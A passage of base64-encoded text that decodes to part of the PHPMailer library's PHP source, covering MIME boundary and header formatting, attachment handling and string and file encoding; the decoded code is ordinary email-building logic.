CAgICAgICAkY29udGVudFR5cGUgPSAkdGhpcy0+Q29udGVudFR5cGU7CiAgICAgICAgfQogICAgICAgIGlmICgkZW5jb2RpbmcgPT0gJycpIHsKICAgICAgICAgICAgJGVuY29kaW5nID0gJHRoaXMtPkVuY29kaW5nOwogICAgICAgIH0KICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT50ZXh0TGluZSgnLS0nIC4gJGJvdW5kYXJ5KTsKICAgICAgICAkcmVzdWx0IC49IHNwcmludGYoJ0NvbnRlbnQtVHlwZTogJXM7IGNoYXJzZXQ9JXMnLCAkY29udGVudFR5cGUsICRjaGFyU2V0KTsKICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT5MRTsKICAgICAgICAvLyBSRkMxMzQxIHBhcnQgNSBzYXlzIDdiaXQgaXMgYXNzdW1lZCBpZiBub3Qgc3BlY2lmaWVkCiAgICAgICAgaWYgKCRlbmNvZGluZyAhPSAnN2JpdCcpIHsKICAgICAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+aGVhZGVyTGluZSgnQ29udGVudC1UcmFuc2Zlci1FbmNvZGluZycsICRlbmNvZGluZyk7CiAgICAgICAgfQogICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPkxFOwoKICAgICAgICByZXR1cm4gJHJlc3VsdDsKICAgIH0KCiAgICAvKioKICAgICAqIFJldHVybiB0aGUgZW5kIG9mIGEgbWVzc2FnZSBib3VuZGFyeS4KICAgICAqIEBhY2Nlc3MgcHJvdGVjdGVkCiAgICAgKiBAcGFyYW0gc3RyaW5nICRib3VuZGFyeQogICAgICogQHJldHVybiBzdHJpbmcKICAgICAqLwogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIGVuZEJvdW5kYXJ5KCRib3VuZGFyeSkKICAgIHsKICAgICAgICByZXR1cm4gJHRoaXMtPkxFIC4gJy0tJyAuICRib3VuZGFyeSAuICctLScgLiAkdGhpcy0+TEU7CiAgICB9CgogICAgLyoqCiAgICAgKiBTZXQgdGhlIG1lc3NhZ2UgdHlwZS4KICAgICAqIFBIUE1haWxlciBvbmx5IHN1cHBvcnRzIHNvbWUgcHJlc2V0IG1lc3NhZ2UgdHlwZXMsCiAgICAgKiBub3QgYXJiaXRyYXJ5IE1JTUUgc3RydWN0dXJlcy4KICAgICAqIEBhY2Nlc3MgcHJvdGVjdGVkCiAgICAgKiBAcmV0dXJuIHZvaWQKICAgICAqLwogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIHNldE1lc3NhZ2VUeXBlKCkKICAgIHsKICAgICAgICAkdHlwZSA9IGFycmF5KCk7CiAgICAgICAgaWYgKCR0aGlzLT5hbHRlcm5hdGl2ZUV4aXN0cygpKSB7CiAgICAgICAgICAgICR0eXBlW10gPSAnYWx0JzsKICAgICAgICB9CiAgICAgICAgaWYgKCR0aGlzLT5pbmxpbmVJbWFnZUV4aXN0cygpKSB7CiAgICAgICAgICAgICR0eXBlW10gPSAnaW5saW5lJzsKICAgICAgICB9CiAgICAgICAgaWYgKCR0aGlzLT5hdHRhY2htZW50RXhpc3RzKCkpIHsKICAgICAgICAgICAgJHR5cGVbXSA9ICdhdHRhY2gnOwogICAgICAgIH0KICAgICAgICAkdGhpcy0+bWVzc2FnZV90eXBlID0gaW1wbG9kZSgnXycsICR0eXBlKTsKICAgICAgICBpZiAoJHRoaXMtPm1lc3NhZ2VfdHlwZSA9PSAnJykgewogICAgICAgICAgICAkdGhpcy0+bWVzc2FnZV90eXBlID0gJ3BsYWluJzsKICAgICAgICB9CiAgICB9CgogICAgLyoqCiAgICAgKiBGb3JtYXQgYSBoZWFkZXIgbGluZS4KICAgICAqIEBhY2Nlc3MgcHVibGljCiAgICAgKiBAcGFyYW0gc3RyaW5nICRuYW1lCiAgICAgKiBAcGFyYW0gc3RyaW5nICR2YWx1ZQogICAgICogQHJldHVybiBzdHJpbmcKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGhlYWRlckxpbmUoJG5hbWUsICR2YWx1ZSkKICAgIHsKICAgICAgICByZXR1cm4gJG5hbWUgLiAnOiAnIC4gJHZhbHVlIC4gJHRoaXMtPkxFOwogICAgfQoKICAgIC8qKgogICAgICogUmV0dXJuIGEgZm9ybWF0dGVkIG1haWwgbGluZS4KICAgICAqIEBhY2Nlc3MgcHVibGljCiAgICAgKiBAcGFyYW0gc3RyaW5nICR2YWx1ZQogICAgICogQHJldHVybiBzdHJpbmcKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIHRleHRMaW5lKCR2YWx1ZSkKICAgIHsKICAgICAgICByZXR1cm4gJHZhbHVlIC4gJHRoaXMtPkxFOwogICAgfQoKICAgIC8qKgogICAgICogQWRkIGFuIGF0dGFjaG1lbnQgZnJvbSBhIHBhdGggb24gdGhlIGZpbGVzeXN0ZW0uCiAgICAgKiBSZXR1cm5zIGZhbHNlIGlmIHRoZSBmaWxlIGNvdWxkIG5vdCBiZSBmb3VuZCBvciByZWFkLgogICAgICogQHBhcmFtIHN0cmluZyAkcGF0aCBQYXRoIHRvIHRoZSBhdHRhY2htZW50LgogICAgICogQHBhcmFtIHN0cmluZyAkbmFtZSBPdmVycmlkZXMgdGhlIGF0dGFjaG1lbnQgbmFtZS4KICAgICAqIEBwYXJhbSBzdHJpbmcgJGVuY29kaW5nIEZpbGUgZW5jb2RpbmcgKHNlZSAkRW5jb2RpbmcpLgogICAgICogQHBhcmFtIHN0cmluZyAkdHlwZSBGaWxlIGV4dGVuc2lvbiAoTUlNRSkgdHlwZS4KICAgICAqIEBwYXJhbSBzdHJpbmcgJGRpc3Bvc2l0aW9uIERpc3Bvc2l0aW9uIHRvIHVzZQogICAgICogQHRocm93cyBwaHBtYWlsZXJFeGNlcHRpb24KICAgICAqIEByZXR1cm4gYm9vbGVhbgogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gYWRkQXR0YWNobWVudCgkcGF0aCwgJG5hbWUgPSAnJywgJGVuY29kaW5nID0gJ2Jhc2U2NCcsICR0eXBlID0gJycsICRkaXNwb3NpdGlvbiA9ICdhdHRhY2htZW50JykKICAgIHsKICAgICAgICB0cnkgewogICAgICAgICAgICBpZiAoIUBpc19maWxlKCRwYXRoKSkgewogICAgICAgICAgICAgICAgdGhyb3cgbmV3IHBocG1haWxlckV4Y2VwdGlvbigkdGhpcy0+bGFuZygnZmlsZV9hY2Nlc3MnKSAuICRwYXRoLCBzZWxmOjpTVE9QX0NPTlRJTlVFKTsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgLy8gSWYgYSBNSU1FIHR5cGUgaXMgbm90IHNwZWNpZmllZCwgdHJ5IHRvIHdvcmsgaXQgb3V0IGZyb20gdGhlIGZpbGUgbmFtZQogICAgICAgICAgICBpZiAoJHR5cGUgPT0gJycpIHsKICAgICAgICAgICAgICAgICR0eXBlID0gc2VsZjo6ZmlsZW5hbWVUb1R5cGUoJHBhdGgpOwogICAgICAgICAgICB9CgogICAgICAgICAgICAkZmlsZW5hbWUgPSBiYXNlbmFtZSgkcGF0aCk7CiAgICAgICAgICAgIGlmICgkbmFtZSA9PSAnJykgewogICAgICAgICAgICAgICAgJG5hbWUgPSAkZmlsZW5hbWU7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICR0aGlzLT5hdHRhY2htZW50W10gPSBhcnJheSgKICAgICAgICAgICAgICAgIDAgPT4gJHBhdGgsCiAgICAgICAgICAgICAgICAxID0+ICRmaWxlbmFtZSwKICAgICAgICAgICAgICAgIDIgPT4gJG5hbWUsCiAgICAgICAgICAgICAgICAzID0+ICRlbmNvZGluZywKICAgICAgICAgICAgICAgIDQgPT4gJHR5cGUsCiAgICAgICAgICAgICAgICA1ID0+IGZhbHNlLCAvLyBpc1N0cmluZ0F0dGFjaG1lbnQKICAgICAgICAgICAgICAgIDYgPT4gJGRpc3Bvc2l0aW9uLAogICAgICAgICAgICAgICAgNyA9PiAwCiAgICAgICAgICAgICk7CgogICAgICAgIH0gY2F0Y2ggKHBocG1haWxlckV4Y2VwdGlvbiAkZXhjKSB7CiAgICAgICAgICAgICR0aGlzLT5zZXRFcnJvcigkZXhjLT5nZXRNZXNzYWdlKCkpOwogICAgICAgICAgICAkdGhpcy0+ZWRlYnVnKCRleGMtPmdldE1lc3NhZ2UoKSk7CiAgICAgICAgICAgIGlmICgkdGhpcy0+ZXhjZXB0aW9ucykgewogICAgICAgICAgICAgICAgdGhyb3cgJGV4YzsKICAgICAgICAgICAgfQogICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgfQogICAgICAgIHJldHVybiB0cnVlOwogICAgfQoKICAgIC8qKgogICAgICogUmV0dXJuIHRoZSBhcnJheSBvZiBhdHRhY2htZW50cy4KICAgICAqIEByZXR1cm4gYXJyYXkKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGdldEF0dGFjaG1lbnRzKCkKICAgIHsKICAgICAgICByZXR1cm4gJHRoaXMtPmF0dGFjaG1lbnQ7CiAgICB9CgogICAgLyoqCiAgICAgKiBBdHRhY2ggYWxsIGZpbGUsIHN0cmluZywgYW5kIGJpbmFyeSBhdHRhY2htZW50cyB0byB0aGUgbWVzc2FnZS4KICAgICAqIFJldHVybnMgYW4gZW1wdHkgc3RyaW5nIG9uIGZhaWx1cmUuCiAgICAgKiBAYWNjZXNzIHByb3RlY3RlZAogICAgICogQHBhcmFtIHN0cmluZyAkZGlzcG9zaXRpb25fdHlwZQogICAgICogQHBhcmFtIHN0cmluZyAkYm91bmRhcnkKICAgICAqIEByZXR1cm4gc3RyaW5nCiAgICAgKi8KICAgIHByb3RlY3RlZCBmdW5jdGlvbiBhdHRhY2hBbGwoJGRpc3Bvc2l0aW9uX3R5cGUsICRib3VuZGFyeSkKICAgIHsKICAgICAgICAvLyBSZXR1cm4gdGV4dCBvZiBib2R5CiAgICAgICAgJG1pbWUgPSBhcnJheSgpOwogICAgICAgICRjaWRVbmlxID0gYXJyYXkoKTsKICAgICAgICAkaW5jbCA9IGFycmF5KCk7CgogICAgICAgIC8vIEFkZCBhbGwgYXR0YWNobWVudHMKICAgICAgICBmb3JlYWNoICgkdGhpcy0+YXR0YWNobWVudCBhcyAkYXR0YWNobWVudCkgewogICAgICAgICAgICAvLyBDaGVjayBpZiBpdCBpcyBhIHZhbGlkIGRpc3Bvc2l0aW9uX2ZpbHRlcgogICAgICAgICAgICBpZiAoJGF0dGFjaG1lbnRbNl0gPT0gJGRpc3Bvc2l0aW9uX3R5cGUpIHsKICAgICAgICAgICAgICAgIC8vIENoZWNrIGZvciBzdHJpbmcgYXR0YWNobWVudAogICAgICAgICAgICAgICAgJHN0cmluZyA9ICcnOwogICAgICAgICAgICAgICAgJHBhdGggPSAnJzsKICAgICAgICAgICAgICAgICRiU3RyaW5nID0gJGF0dGFjaG1lbnRbNV07CiAgICAgICAgICAgICAgICBpZiAoJGJTdHJpbmcpIHsKICAgICAgICAgICAgICAgICAgICAkc3RyaW5nID0gJGF0dGFjaG1lbnRbMF07CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICRwYXRoID0gJGF0dGFjaG1lbnRbMF07CiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgJGluY2xoYXNoID0gbWQ1KHNlcmlhbGl6ZSgkYXR0YWNobWVudCkpOwogICAgICAgICAgICAgICAgaWYgKGluX2FycmF5KCRpbmNsaGFzaCwgJGluY2wpKSB7CiAgICAgICAgICAgICAgICAgICAgY29udGludWU7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAkaW5jbFtdID0gJGluY2xoYXNoOwogICAgICAgICAgICAgICAgJG5hbWUgPSAkYXR0YWNobWVudFsyXTsKICAgICAgICAgICAgICAgICRlbmNvZGluZyA9ICRhdHRhY2htZW50WzNdOwogICAgICAgICAgICAgICAgJHR5cGUgPSAkYXR0YWNobWVudFs0XTsKICAgICAgICAgICAgICAgICRkaXNwb3NpdGlvbiA9ICRhdHRhY2htZW50WzZdOwogICAgICAgICAgICAgICAgJGNpZCA9ICRhdHRhY2htZW50WzddOwogICAgICAgICAgICAgICAgaWYgKCRkaXNwb3NpdGlvbiA9PSAnaW5saW5lJyAmJiBhcnJheV9rZXlfZXhpc3RzKCRjaWQsICRjaWRVbmlxKSkgewogICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgJGNpZFVuaXFbJGNpZF0gPSB0cnVlOwoKICAgICAgICAgICAgICAgICRtaW1lW10gPSBzcHJpbnRmKCctLSVzJXMnLCAkYm91bmRhcnksICR0aGlzLT5MRSk7CiAgICAgICAgICAgICAgICAvL09ubHkgaW5jbHVkZSBhIGZpbGVuYW1lIHByb3BlcnR5IGlmIHdlIGhhdmUgb25lCiAgICAgICAgICAgICAgICBpZiAoIWVtcHR5KCRuYW1lKSkgewogICAgICAgICAgICAgICAgICAgICRtaW1lW10gPSBzcHJpbnRmKAogICAgICAgICAgICAgICAgICAgICAgICAnQ29udGVudC1UeXBlOiAlczsgbmFtZT0iJXMiJXMnLAogICAgICAgICAgICAgICAgICAgICAgICAkdHlwZSwKICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPmVuY29kZUhlYWRlcigkdGhpcy0+c2VjdXJlSGVhZGVyKCRuYW1lKSksCiAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5MRQogICAgICAgICAgICAgICAgICAgICk7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICRtaW1lW10gPSBzcHJpbnRmKAogICAgICAgICAgICAgICAgICAgICAgICAnQ29udGVudC1UeXBlOiAlcyVzJywKICAgICAgICAgICAgICAgICAgICAgICAgJHR5cGUsCiAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5MRQogICAgICAgICAgICAgICAgICAgICk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAvLyBSRkMxMzQxIHBhcnQgNSBzYXlzIDdiaXQgaXMgYXNzdW1lZCBpZiBub3Qgc3BlY2lmaWVkCiAgICAgICAgICAgICAgICBpZiAoJGVuY29kaW5nICE9ICc3Yml0JykgewogICAgICAgICAgICAgICAgICAgICRtaW1lW10gPSBzcHJpbnRmKCdDb250ZW50LVRyYW5zZmVyLUVuY29kaW5nOiAlcyVzJywgJGVuY29kaW5nLCAkdGhpcy0+TEUpOwogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGlmICgkZGlzcG9zaXRpb24gPT0gJ2lubGluZScpIHsKICAgICAgICAgICAgICAgICAgICAkbWltZVtdID0gc3ByaW50ZignQ29udGVudC1JRDogPCVzPiVzJywgJGNpZCwgJHRoaXMtPkxFKTsKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAvLyBJZiBhIGZpbGVuYW1lIGNvbnRhaW5zIGFueSBvZiB0aGVzZSBjaGFycywgaXQgc2hvdWxkIGJlIHF1b3RlZCwKICAgICAgICAgICAgICAgIC8vIGJ1dCBub3Qgb3RoZXJ3aXNlOiBSRkMyMTgzICYgUkZDMjA0NSA1LjEKICAgICAgICAgICAgICAgIC8vIEZpeGVzIGEgd2FybmluZyBpbiBJRVRGJ3MgbXNnbGludCBNSU1FIGNoZWNrZXIKICAgICAgICAgICAgICAgIC8vIEFsbG93IGZvciBieXBhc3NpbmcgdGhlIENvbnRlbnQtRGlzcG9zaXRpb24gaGVhZGVyIHRvdGFsbHkKICAgICAgICAgICAgICAgIGlmICghKGVtcHR5KCRkaXNwb3NpdGlvbikpKSB7CiAgICAgICAgICAgICAgICAgICAgJGVuY29kZWRfbmFtZSA9ICR0aGlzLT5lbmNvZGVIZWFkZXIoJHRoaXMtPnNlY3VyZUhlYWRlcigkbmFtZSkpOwogICAgICAgICAgICAgICAgICAgIGlmIChwcmVnX21hdGNoKCcvWyBcKFwpPD5ALDs6XFwiXC9cW1xdXD89XS8nLCAkZW5jb2RlZF9uYW1lKSkgewogICAgICAgICAgICAgICAgICAgICAgICAkbWltZVtdID0gc3ByaW50ZigKICAgICAgICAgICAgICAgICAgICAgICAgICAgICdDb250ZW50LURpc3Bvc2l0aW9uOiAlczsgZmlsZW5hbWU9IiVzIiVzJywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRkaXNwb3NpdGlvbiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRlbmNvZGVkX25hbWUsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+TEUgLiAkdGhpcy0+TEUKICAgICAgICAgICAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoIWVtcHR5KCRlbmNvZGVkX25hbWUpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkbWltZVtdID0gc3ByaW50ZigKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnQ29udGVudC1EaXNwb3NpdGlvbjogJXM7IGZpbGVuYW1lPSVzJXMnLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRkaXNwb3NpdGlvbiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkZW5jb2RlZF9uYW1lLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5MRSAuICR0aGlzLT5MRQogICAgICAgICAgICAgICAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRtaW1lW10gPSBzcHJpbnRmKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdDb250ZW50LURpc3Bvc2l0aW9uOiAlcyVzJywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkZGlzcG9zaXRpb24sCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPkxFIC4gJHRoaXMtPkxFCiAgICAgICAgICAgICAgICAgICAgICAgICAgICApOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkbWltZVtdID0gJHRoaXMtPkxFOwogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIC8vIEVuY29kZSBhcyBzdHJpbmcgYXR0YWNobWVudAogICAgICAgICAgICAgICAgaWYgKCRiU3RyaW5nKSB7CiAgICAgICAgICAgICAgICAgICAgJG1pbWVbXSA9ICR0aGlzLT5lbmNvZGVTdHJpbmcoJHN0cmluZywgJGVuY29kaW5nKTsKICAgICAgICAgICAgICAgICAgICBpZiAoJHRoaXMtPmlzRXJyb3IoKSkgewogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gJyc7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICRtaW1lW10gPSAkdGhpcy0+TEUgLiAkdGhpcy0+TEU7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICRtaW1lW10gPSAkdGhpcy0+ZW5jb2RlRmlsZSgkcGF0aCwgJGVuY29kaW5nKTsKICAgICAgICAgICAgICAgICAgICBpZiAoJHRoaXMtPmlzRXJyb3IoKSkgewogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gJyc7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICRtaW1lW10gPSAkdGhpcy0+TEUgLiAkdGhpcy0+TEU7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgICRtaW1lW10gPSBzcHJpbnRmKCctLSVzLS0lcycsICRib3VuZGFyeSwgJHRoaXMtPkxFKTsKCiAgICAgICAgcmV0dXJuIGltcGxvZGUoJycsICRtaW1lKTsKICAgIH0KCiAgICAvKioKICAgICAqIEVuY29kZSBhIGZpbGUgYXR0YWNobWVudCBpbiByZXF1ZXN0ZWQgZm9ybWF0LgogICAgICogUmV0dXJucyBhbiBlbXB0eSBzdHJpbmcgb24gZmFpbHVyZS4KICAgICAqIEBwYXJhbSBzdHJpbmcgJHBhdGggVGhlIGZ1bGwgcGF0aCB0byB0aGUgZmlsZQogICAgICogQHBhcmFtIHN0cmluZyAkZW5jb2RpbmcgVGhlIGVuY29kaW5nIHRvIHVzZTsgb25lIG9mICdiYXNlNjQnLCAnN2JpdCcsICc4Yml0JywgJ2JpbmFyeScsICdxdW90ZWQtcHJpbnRhYmxlJwogICAgICogQHRocm93cyBwaHBtYWlsZXJFeGNlcHRpb24KICAgICAqIEBhY2Nlc3MgcHJvdGVjdGVkCiAgICAgKiBAcmV0dXJuIHN0cmluZwogICAgICovCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gZW5jb2RlRmlsZSgkcGF0aCwgJGVuY29kaW5nID0gJ2Jhc2U2NCcpCiAgICB7CiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgaWYgKCFpc19yZWFkYWJsZSgkcGF0aCkpIHsKICAgICAgICAgICAgICAgIHRocm93IG5ldyBwaHBtYWlsZXJFeGNlcHRpb24oJHRoaXMtPmxhbmcoJ2ZpbGVfb3BlbicpIC4gJHBhdGgsIHNlbGY6OlNUT1BfQ09OVElOVUUpOwogICAgICAgICAgICB9CiAgICAgICAgICAgICRtYWdpY19xdW90ZXMgPSBnZXRfbWFnaWNfcXVvdGVzX3J1bnRpbWUoKTsKICAgICAgICAgICAgaWYgKCRtYWdpY19xdW90ZXMpIHsKICAgICAgICAgICAgICAgIGlmICh2ZXJzaW9uX2NvbXBhcmUoUEhQX1ZFUlNJT04sICc1LjMuMCcsICc8JykpIHsKICAgICAgICAgICAgICAgICAgICBzZXRfbWFnaWNfcXVvdGVzX3J1bnRpbWUoZmFsc2UpOwogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAvL0RvZXNuJ3QgZXhpc3QgaW4gUEhQIDUuNCwgYnV0IHdlIGRvbid0IG5lZWQgdG8gY2hlY2sgYmVjYXVzZQogICAgICAgICAgICAgICAgICAgIC8vZ2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lIGFsd2F5cyByZXR1cm5zIGZhbHNlIGluIDUuNCsKICAgICAgICAgICAgICAgICAgICAvL3NvIGl0IHdpbGwgbmV2ZXIgZ2V0IGhlcmUKICAgICAgICAgICAgICAgICAgICBpbmlfc2V0KCdtYWdpY19xdW90ZXNfcnVudGltZScsIGZhbHNlKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICAkZmlsZV9idWZmZXIgPSBmaWxlX2dldF9jb250ZW50cygkcGF0aCk7CiAgICAgICAgICAgICRmaWxlX2J1ZmZlciA9ICR0aGlzLT5lbmNvZGVTdHJpbmcoJGZpbGVfYnVmZmVyLCAkZW5jb2RpbmcpOwogICAgICAgICAgICBpZiAoJG1hZ2ljX3F1b3RlcykgewogICAgICAgICAgICAgICAgaWYgKHZlcnNpb25fY29tcGFyZShQSFBfVkVSU0lPTiwgJzUuMy4wJywgJzwnKSkgewogICAgICAgICAgICAgICAgICAgIHNldF9tYWdpY19xdW90ZXNfcnVudGltZSgkbWFnaWNfcXVvdGVzKTsKICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgaW5pX3NldCgnbWFnaWNfcXVvdGVzX3J1bnRpbWUnLCAkbWFnaWNfcXVvdGVzKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICByZXR1cm4gJGZpbGVfYnVmZmVyOwogICAgICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiAkZXhjKSB7CiAgICAgICAgICAgICR0aGlzLT5zZXRFcnJvcigkZXhjLT5nZXRNZXNzYWdlKCkpOwogICAgICAgICAgICByZXR1cm4gJyc7CiAgICAgICAgfQogICAgfQoKICAgIC8qKgogICAgICogRW5jb2RlIGEgc3RyaW5nIGluIHJlcXVlc3RlZCBmb3JtYXQuCiAgICAgKiBSZXR1cm5zIGFuIGVtcHR5IHN0cmluZyBvbiBmYWlsdXJlLgogICAgICogQHBhcmFtIHN0cmluZyAkc3RyIFRoZSB0ZXh0IHRvIGVuY29kZQogICAgICogQHBhcmFtIHN0cmluZyAkZW5jb2RpbmcgVGhlIGVuY29kaW5nIHRvIHVzZTsgb25lIG9mICdiYXNlNjQnLCAnN2JpdCcsICc4Yml0JywgJ2JpbmFyeScsICdxdW90ZWQtcHJpbnRhYmxlJwogICAgICogQGFjY2VzcyBwdWJsaWMKICAgICAqIEByZXR1cm4gc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBlbmNvZGVTdHJpbmcoJHN0ciwgJGVuY29kaW5nID0gJ2Jhc2U2NCcpCiAgICB7CiAgICAgICAgJGVuY29kZWQgPSAnJzsKICAgICAgICBzd2l0Y2ggKHN0cnRvbG93ZXIoJGVuY29kaW5nKSkgewogICAgICAgICAgICBjYXNlICdiYXNlNjQnOgogICAgICAgICAgICAgICAgJGVuY29kZWQgPSBjaHVua19zcGxpdChiYXNlNjRfZW5jb2RlKCRzdHIpLCA3NiwgJHRoaXMtPkxFKTsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICBjYXNlICc3Yml0JzoKICAgICAgICAgICAgY2FzZSAnOGJpdCc6CiAgICAgICAgICAgICAgICAkZW5jb2RlZCA9ICR0aGlzLT5maXhFT0woJHN0cik7CiAgICAgICAgICAgICAgICAvLyBNYWtlIHN1cmUgaXQgZW5kcyB3aXRoIGEgbGluZSBicmVhawogICAgICAgICAgICAgICAgaWYgKHN1YnN0cigkZW5jb2RlZCwgLShzdHJsZW4oJHRoaXMtPkxFKSkpICE9ICR0aGlzLT5MRSkgewogICAgICAgICAgICAgICAgICAgICRlbmNvZGVkIC49ICR0aGlzLT5MRTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICBjYXNlICdiaW5hcnknOgogICAgICAgICAgICAgICAgJGVuY29kZWQgPSAkc3RyOwogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgIGNhc2UgJ3F1b3RlZC1wcmludGFibGUnOgogICAgICAgICAgICAgICAgJGVuY29kZWQgPSAkdGhpcy0+ZW5jb2RlUVAoJHN0cik7CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgZGVmYXVsdDoKICAgICAgICAgICAgICAgICR0aGlzLT5zZXRFcnJvcigkdGhpcy0+bGFuZygnZW5jb2RpbmcnKSAuICRlbmNvZGluZyk7CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICB9CiAgICAgICAgcmV0dXJuICRlbmNvZGVkOwogICAgfQoKICAgIC8qKgogICAgICogRW5jb2RlIGEgaGVhZGVyIHN0cmluZyBvcHRpbWFsbHkuCiAgICAgKiBQaWNrcyBzaG9ydGVzdCBvZiBRLCBCLCBxdW90ZWQtcHJpbnRhYmxlIG9yIG5vbmUuCiAgICAgKiBAYWNjZXNzIHB1YmxpYwogICAgICogQHBhcmFtIHN0cmluZyAkc3RyCiAgICAgKiBAcGFyYW0gc3RyaW5nICRwb3NpdGlvbgogICAgICogQHJldHVybiBzdHJpbmcKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGVuY29kZUhlYWRlcigkc3RyLCAkcG9zaXRpb24gPSAndGV4dCcpCiAgICB7CiAgICAgICAgJG1hdGNoY291bnQgPSAwOwogICAgICAgIHN3aXRjaCAoc3RydG9sb3dlcigkcG9zaXRpb24pKSB7CiAgICAgICAgICAgIGNhc2UgJ3BocmFzZSc6CiAgICAgICAgICAgICAgICBpZiAoIXByZWdfbWF0Y2goJy9bXDIwMC1cMzc3XS8nLCAkc3RyKSkgewogICAgICAgICAgICAgICAgICAgIC8vIENhbid0IHVzZSBhZGRzbGFzaGVzIGFzIHdlIGRvbid0IGtub3cgdGhlIHZhbHVlIG9mIG1hZ2ljX3F1b3Rlc19zeWJhc2UKICAgICAgICAgICAgICAgICAgICAkZW5jb2RlZCA9IGFkZGNzbGFzaGVzKCRzdHIsICJcMC4uXDM3XDE3N1xcXCIiKTsKICAgICAgICAgICAgICAgICAgICBpZiAoKCRzdHIgPT0gJGVuY29kZWQpICYmICFwcmVnX21hdGNoKCcvW15BLVphLXowLTkhIyQlJlwnKitcLz0/Xl9ge3x9fiAtXS8nLCAkc3RyKSkgewogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gKCRlbmNvZGVkKTsKICAgICAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gKCJcIiRlbmNvZGVkXCIiKTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAkbWF0Y2hjb3VudCA9IHByZWdfbWF0Y2hfYWxsKCcvW15cMDQwXDA0MVwwNDMtXDEzM1wxMzUtXDE3Nl0vJywgJHN0ciwgJG1hdGNoZXMpOwogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgIC8qKiBAbm9pbnNwZWN0aW9uIFBocE1pc3NpbmdCcmVha1N0YXRlbWVudEluc3BlY3Rpb24gKi8KICAgICAgICAgICAgY2FzZSAnY29tbWVudCc6CiAgICAgICAgICAgICAgICAkbWF0Y2hjb3VudCA9IHByZWdfbWF0Y2hfYWxsKCcvWygpIl0vJywgJHN0ciwgJG1hdGNoZXMpOwogICAgICAgICAgICAgICAgLy8gSW50ZW50aW9uYWwgZmFsbC10aHJvdWdoCiAgICAgICAgICAgIGNhc2UgJ3RleHQnOgogICAgICAgICAgICBkZWZhd